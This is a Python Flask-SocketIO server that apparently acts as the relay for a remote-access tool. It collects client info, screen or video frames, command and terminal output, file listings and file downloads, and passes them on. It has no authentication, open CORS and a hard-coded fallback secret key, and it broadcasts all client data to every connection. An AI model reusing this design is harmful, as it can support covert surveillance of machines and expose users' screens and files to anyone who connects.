import os
import base64
import logging
from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'secret!')
socketio = SocketIO(app, cors_allowed_origins='*', async_mode='threading')

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('server')


class ClientManager:
    def __init__(self):
        self.clients = {}

    def add_client(self, sid, info):
        self.clients[sid] = {
            'info': info,
            'last_frame': None,
            'streaming': False
        }
        logger.info(f"Client {sid} added: {info}")

    def remove_client(self, sid):
        if sid in self.clients:
            logger.info(f"Client {sid} removed")
            del self.clients[sid]

    def get_client(self, sid):
        return self.clients.get(sid, None)

    def get_all_clients(self):
        return self.clients


client_manager = ClientManager()


@app.route('/')
def index():
    return render_template('index.html')


@socketio.on('connect')
def handle_connect():
    logger.info(f"Client connected: {request.sid}")


@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Client disconnected: {request.sid}")
    client_manager.remove_client(request.sid)

    socketio.emit('client_disconnected', {'client_id': request.sid}, to=None)


@socketio.on('whoami')
def handle_whoami(data):
    logger.info(f"Client info received: {data}")
    client_manager.add_client(request.sid, data)

    socketio.emit('client_connected', {
        'sid': request.sid,
        'info': data
    }, to=None)

    emit('client_info', {
        'client_id': request.sid,
        'info': data
    })

@socketio.on('frame')
def handle_frame(data):
    try:
        if isinstance(data, bytes):
            frame_b64 = base64.b64encode(data).decode('utf-8')
        else:
            frame_b64 = data

        client = client_manager.get_client(request.sid)
        if client:
            client['last_frame'] = frame_b64
            client['streaming'] = True

        socketio.emit('video_frame', {
            'client_id': request.sid,
            'frame': frame_b64
        })
    except Exception as e:
        logger.error(f"Error handling frame: {e}")


@socketio.on('recording_frame')
def handle_recording_frame(data):
    try:
        socketio.emit('record_frame', {
            'client_id': request.sid,
            'frame': data
        })
    except Exception as e:
        logger.error(f"Error handling recording frame: {e}")


@socketio.on('recording_ended')
def handle_recording_ended():
    try:
        socketio.emit('recording_ended', {
            'client_id': request.sid
        })
    except Exception as e:
        logger.error(f"Error handling recording ended: {e}")


@socketio.on('stream_status')
def handle_stream_status(data):
    try:
        socketio.emit('stream_status', {
            'client_id': request.sid,
            'status': data
        })
    except Exception as e:
        logger.error(f"Error handling stream status: {e}")


@socketio.on('command_result')
def handle_command_result(data):
    try:
        socketio.emit('command_response', {
            'client_id': request.sid,
            'output': data
        })
    except Exception as e:
        logger.error(f"Error handling command result: {e}")


@socketio.on('terminal_output')
def handle_terminal_output(data):
    try:
        socketio.emit('terminal_output', {
            'client_id': request.sid,
            'output': data
        })
    except Exception as e:
        logger.error(f"Error handling terminal output: {e}")


@socketio.on('file_explorer')
def handle_file_explorer(data):
    try:
        socketio.emit('file_explorer', {
            'client_id': request.sid,
            'data': data
        })
    except Exception as e:
        logger.error(f"Error handling file explorer: {e}")


@socketio.on('file_chunk')
def handle_file_chunk(data):
    try:
        socketio.emit('file_chunk_received', {
            'client_id': request.sid,
            'chunk': data
        })
    except Exception as e:
        logger.error(f"Error handling file chunk: {e}")


@socketio.on('file_download_complete')
def handle_file_download_complete():
    try:
        socketio.emit('file_download_complete', {
            'client_id': request.sid
        })
    except Exception as e:
        logger.error(f"Error handling file download complete: {e}")


@socketio.on('client_error')
def handle_client_error(data):
    try:
        socketio.emit('client_error', {
            'client_id': request.sid,
            'error': data
        })
    except Exception as e:
        logger.error(f"Error handling client error: {e}")


@socketio.on('client_warning')
def handle_client_warning(data):
    try:
        socketio.emit('client_warning', {
            'client_id': request.sid,
            'warning': data
        })
    except Exception as e:
        logger.error(f"Error handling client warning: {e}")

@socketio.on('get_clients')
def handle_get_clients():
    clients = client_manager.get_all_clients()
    formatted_clients = {sid: client['info'] for sid, client in clients.items()}
    emit('clients_list', {'clients': formatted_clients})  # enviado só para quem pediu


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host='0.0.0.0', port=port)
